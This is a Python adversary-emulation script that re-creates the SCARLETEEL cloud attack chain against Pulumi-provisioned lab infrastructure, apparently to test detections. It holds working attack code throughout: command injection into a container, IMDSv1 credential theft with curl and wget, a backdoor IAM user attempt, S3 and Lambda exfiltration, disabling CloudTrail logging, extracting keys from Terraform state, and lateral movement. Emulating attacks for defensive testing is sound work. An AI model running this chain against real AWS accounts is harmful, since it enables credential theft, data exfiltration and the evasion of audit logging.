"""
SCARLETEEL -- Adversary Emulation Attack Script
Executes a 6-phase attack chain against the Pulumi-provisioned infrastructure.

Threat Actor: SCARLETEEL (cryptomining / credential theft campaign targeting
containerised AWS workloads with IMDSv1-enabled EC2 hosts)

Attack chain:
  Phase 1 -- Container RCE + IMDSv1 credential theft (T1190, T1552.005, T1496)
  Phase 2 -- Privilege escalation attempt via stolen creds (T1078.004)
  Phase 3 -- S3 & Lambda enumeration + data exfiltration (T1526, T1530, T1005)
  Phase 4 -- Defense evasion: CloudTrail StopLogging (T1562.008)
  Phase 5 -- Terraform state credential theft (T1552.001)
  Phase 6 -- Lateral movement via stolen bait credentials (T1078.004)

Pre-requisites:
  Run `pulumi up` in ../infra/ first.
  The instance needs ~2-3 min after provisioning for Docker to start.
"""

import sys

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
import time
from pathlib import Path

import boto3
import botocore.exceptions
import requests


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


def print_step(msg: str) -> None:
    print(f"\n[*] {msg}")


def exploit_rce(target_url: str, cmd: str) -> str | None:
    """Exploit the command injection vulnerability in the containerised webapp."""
    try:
        resp = requests.post(f"{target_url}/cmd", data={"cmd": cmd}, timeout=30)
        return resp.text
    except requests.RequestException as e:
        print(f"    -> HTTP exploit error: {e}")
        return None


def wait_for_container(target_url: str, max_wait: int = 300, interval: int = 10) -> bool:
    """Poll the /health endpoint until the vulnerable container is ready."""
    print(f"    Waiting for vulnerable container at {target_url} ...")
    elapsed = 0
    while elapsed < max_wait:
        try:
            resp = requests.get(f"{target_url}/health", timeout=5)
            if resp.status_code == 200:
                print(f"    Container is live after ~{elapsed}s.")
                return True
        except requests.RequestException:
            pass
        time.sleep(interval)
        elapsed += interval
    print(f"    Container not ready after {max_wait}s.")
    return False


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir = str(Path(__file__).parent.parent / "infra")
    infra     = get_pulumi_outputs(stack_dir)

    target_ip = infra.get("vuln_instance_ip", "")
    if not target_ip:
        print("[!] vuln_instance_ip not found in Pulumi outputs.")
        print("    Run `pulumi up` in ../infra/ first, then re-run this script.")
        sys.exit(1)

    target_url = f"http://{target_ip}:8080"

    banner("SCARLETEEL Attack Emulation")
    print(f"  Target IP  : {target_ip}")
    print(f"  Target URL : {target_url}")
    print(f"  Trail name : {infra.get('trail_name', '(unknown)')}")
    print(f"  TF-state bucket : {infra.get('tf_state_bucket', '(unknown)')}")

    # Wait for the vulnerable container to come online
    if not wait_for_container(target_url):
        print("[!] Vulnerable container never became ready. Aborting.")
        sys.exit(1)

    # ── Phase 1: Initial Compromise via Container RCE + IMDSv1 Credential Theft ──
    banner("Phase 1 — Initial Compromise: Container RCE + IMDSv1 Credential Theft")
    print("  MITRE: T1190 (Exploit Public-Facing Application)")
    print("         T1552.005 (Cloud Instance Metadata API)")
    print("         T1496 (Resource Hijacking — cryptominer)")

    # Step 1: Deploy cryptominer decoy (XMRig simulation)
    print_step("Deploying cryptominer simulation via RCE (T1496)...")
    exploit_rce(target_url, """cat > /tmp/config_background.json << 'MINERCONF'
{"pools":[{"url":"stratum+tcp://pool.example.com:3333","user":"wallet_placeholder","pass":"x"}],"background":true}
MINERCONF""")

    miner_output = exploit_rce(target_url, """cat > /tmp/miner.sh << 'MINERSCRIPT'
#!/bin/bash
echo '[*] XMRig miner simulation started'
echo '[*] Loading config from /tmp/config_background.json'
cat /tmp/config_background.json
echo '[*] Mining process simulated (no actual mining)'
MINERSCRIPT
chmod +x /tmp/miner.sh && /tmp/miner.sh""")
    if miner_output:
        print(f"    -> Miner output: {miner_output.strip().splitlines()[0]}")

    # Step 2: Steal IAM credentials via IMDSv1 from inside the container
    print_step("Exploiting IMDSv1 from inside the container (T1552.005)...")

    role_name = exploit_rce(target_url,
        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    if not role_name or not role_name.strip():
        print("[!] Failed to discover IAM role via IMDS. Container may lack metadata access.")
        sys.exit(1)
    role_name = role_name.strip()
    print(f"    -> Discovered IAM Role: {role_name}")

    creds_raw = exploit_rce(target_url,
        f"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}")
    if not creds_raw:
        print("[!] Failed to fetch IMDS credentials.")
        sys.exit(1)

    print("    -> Stolen IMDS credential payload received.")
    try:
        stolen_creds = json.loads(creds_raw)
    except json.JSONDecodeError as e:
        print(f"[!] Failed to parse IMDS JSON: {e}")
        print(f"    Raw output: {creds_raw[:200]}")
        sys.exit(1)

    if "AccessKeyId" not in stolen_creds:
        print(f"[!] Missing AccessKeyId in IMDS response: {stolen_creds}")
        sys.exit(1)

    print(f"    -> AccessKeyId : {stolen_creds['AccessKeyId']}")
    print(f"    -> Expiration  : {stolen_creds.get('Expiration', 'N/A')}")

    # Step 3: Replicate SCARLETEEL wget/sed/grep credential pipeline inside container
    print_step("Replicating SCARLETEEL wget/sed/grep credential pipeline inside container...")
    exploit_rce(target_url, f"""cd /tmp && mkdir -p aws_stolen && cd aws_stolen && \
wget -q -O raw.json http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name} && \
cat raw.json | sed s/,/\\n/g | grep 'AccessKeyId\\|SecretAccessKey\\|Token' > grepped.txt && \
cat grepped.txt | sed 's# "AccessKeyId" : "#aws configure set aws_access_key_id #g' > 1.sh && \
cat 1.sh | sed 's# "SecretAccessKey" : "#aws configure set aws_secret_access_key #g' > 2.sh && \
cat 2.sh | sed 's# "Token" : "#aws configure set aws_session_token #g' > 3.sh && \
cat 3.sh | sed s/\\"//g > configure_stolen.sh && \
chmod +x configure_stolen.sh && sh configure_stolen.sh && \
aws configure set region us-east-1""")
    print("    -> SCARLETEEL credential pipeline executed inside container.")

    # Pivot to local boto3 using the stolen credentials
    session = boto3.Session(
        aws_access_key_id=stolen_creds["AccessKeyId"],
        aws_secret_access_key=stolen_creds["SecretAccessKey"],
        aws_session_token=stolen_creds["Token"],
        region_name="us-east-1",
    )

    stolen_iam    = session.client("iam")
    stolen_s3     = session.client("s3")
    stolen_lambda = session.client("lambda")
    stolen_ct     = session.client("cloudtrail")

    # ── Phase 2: Privilege Escalation Attempt ─────────────────────────────────
    banner("Phase 2 — Privilege Escalation Attempt (T1078.004, T1098)")

    print_step("Attempting iam:CreateUser (ScarleteelBackdoor)...")
    try:
        stolen_iam.create_user(UserName="ScarleteelBackdoor")
        print("    -> [WARNING] create_user succeeded! The role is too permissive.")
    except Exception:
        print("    -> SUCCESS: create_user correctly failed via IAM restrictions.")

    print_step("Attempting iam:CreateAccessKey on AdminJoe...")
    try:
        stolen_iam.create_access_key(UserName="AdminJoe")
    except Exception:
        print("    -> SUCCESS: create_access_key correctly failed via IAM restrictions.")

    # ── Phase 3: S3 & Lambda Enumeration + Data Exfiltration ──────────────────
    banner("Phase 3 — S3 & Lambda Enumeration + Data Exfiltration (T1526, T1530, T1005)")

    target_state_bucket: str | None = None
    try:
        buckets = stolen_s3.list_buckets()["Buckets"]
        print(f"  [+] Discovered {len(buckets)} S3 Buckets.")
        for b in buckets:
            name = b["Name"]
            if "tf-state" in name:
                target_state_bucket = name

            print(f"       -> Listing objects in {name}...")
            try:
                objects = stolen_s3.list_objects_v2(Bucket=name).get("Contents", [])
                print(f"          -> Found {len(objects)} objects.")
                if "scarleteel" in name:
                    for obj in objects:
                        obj_key = obj["Key"]
                        if obj_key == "terraform.tfstate":
                            continue  # Handled in Phase 5
                        print(f"          -> Exfiltrating: s3://{name}/{obj_key} ({obj['Size']} bytes)")
                        stolen_s3.get_object(Bucket=name, Key=obj_key)
            except Exception as e:
                print(f"          -> Access error: {e}")
    except Exception as e:
        print(f"  [!] ERROR enumerating S3: {e}")

    try:
        funcs = stolen_lambda.list_functions()["Functions"]
        print(f"\n  [+] Discovered {len(funcs)} Lambda Functions.")
        for f in funcs:
            fn_name = f["FunctionName"]
            print(f"       -> Digging into: {fn_name}")

            code_info = stolen_lambda.get_function(FunctionName=fn_name)
            code_url  = code_info["Code"]["Location"]
            print(f"          -> Location URL: {code_url[:80]}...")
            try:
                import urllib.request
                urllib.request.urlretrieve(code_url, f"/tmp/{fn_name}.zip")
                print(f"          -> Downloaded source code to /tmp/{fn_name}.zip")
            except Exception as e:
                print(f"          -> Code download failed: {e}")

            versions = stolen_lambda.list_versions_by_function(FunctionName=fn_name)["Versions"]
            for v in versions:
                env = v.get("Environment", {}).get("Variables", {})
                if env:
                    print(f"          -> Env Vars Dumped: {env}")

            try:
                stolen_lambda.get_policy(FunctionName=fn_name)
            except Exception:
                pass
            stolen_lambda.list_aliases(FunctionName=fn_name)

            tags = stolen_lambda.list_tags(Resource=code_info["Configuration"]["FunctionArn"])
            if tags.get("Tags"):
                print(f"          -> Tags: {tags['Tags']}")

            esm = stolen_lambda.list_event_source_mappings(FunctionName=fn_name)
            if esm.get("EventSourceMappings"):
                print(f"          -> Event Source Mappings: {len(esm['EventSourceMappings'])} found")
    except Exception as e:
        print(f"  [!] ERROR enumerating Lambda: {e}")

    # ── Phase 4: Defense Evasion ───────────────────────────────────────────────
    banner("Phase 4 — Defense Evasion: CloudTrail StopLogging (T1562.008)")

    try:
        trails = stolen_ct.describe_trails()["trailList"]
        print(f"  [+] Discovered {len(trails)} CloudTrail trail(s).")
        for trail in trails:
            tname = trail["Name"]
            if "scarleteel" in tname:
                print(f"    -> Stopping target trail: {tname}")
                stolen_ct.stop_logging(Name=trail["TrailARN"])
                print("    -> SUCCESS: CloudTrail logging disabled.")
                print("    [!] CloudTrail event: StopLogging")
                print("    [!] GuardDuty finding: Stealth:IAMUser/CloudTrailLoggingDisabled")
    except Exception as e:
        print(f"  [!] ERROR disabling trail: {e}")

    # ── Phase 5: Terraform State Credential Theft ──────────────────────────────
    lateral_creds: dict | None = None
    banner("Phase 5 — Lateral Movement Preparation: Terraform State Theft (T1552.001)")

    if target_state_bucket:
        try:
            print(f"    -> Fetching terraform.tfstate from {target_state_bucket}...")
            obj        = stolen_s3.get_object(Bucket=target_state_bucket, Key="terraform.tfstate")
            state_data = json.loads(obj["Body"].read().decode("utf-8"))

            resources = state_data.get("resources", [])
            for r in resources:
                if r.get("type") == "aws_iam_access_key":
                    attrs        = r["instances"][0]["attributes"]
                    lateral_creds = attrs
                    print("    -> SUCCESS: Extracted Lateral Movement Credentials!")
                    print(f"       AccessKeyId     : {attrs.get('id')}")
                    print(f"       SecretAccessKey : {attrs.get('secret')}")
        except Exception as e:
            print(f"    -> ERROR stealing terraform state: {e}")
    else:
        print("    -> No terraform state bucket found in S3 enumeration.")

    # ── Phase 6: Lateral Movement ──────────────────────────────────────────────
    banner("Phase 6 — Lateral Movement via Stolen Bait Credentials (T1078.004)")

    if lateral_creds:
        lateral_session = boto3.Session(
            aws_access_key_id=lateral_creds.get("id"),
            aws_secret_access_key=lateral_creds.get("secret"),
            region_name="us-east-1",
        )
        t_sts = lateral_session.client("sts")
        t_iam = lateral_session.client("iam")

        try:
            identity = t_sts.get_caller_identity()
            print(f"    -> SUCCESS: sts:GetCallerIdentity passed! Moving as {identity['Arn']}")
        except Exception as e:
            print(f"    -> ERROR on identity: {e}")

        try:
            t_iam.list_users()
            print("    -> [WARNING] Lateral IAM enumeration succeeded — role not isolated!")
        except botocore.exceptions.ClientError as e:
            if "AccessDenied" in str(e):
                print("    -> SUCCESS: iam:ListUsers denied (zero-permission bait user — expected).")
            else:
                print(f"    -> Unexpected ERROR: {e}")
    else:
        print("    -> No lateral movement credentials available. Skipping.")

    banner("SCARLETEEL Emulation Complete")
    print("  CloudTrail events generated: StopLogging, ListBuckets, ListObjectsV2,")
    print("    GetObject, ListFunctions, GetFunction, ListVersionsByFunction,")
    print("    GetPolicy, ListAliases, ListTags, DescribeTrails, GetCallerIdentity")
    print("  Run `pulumi destroy` in ../infra/ to remove all prerequisites.")


if __name__ == "__main__":
    main()
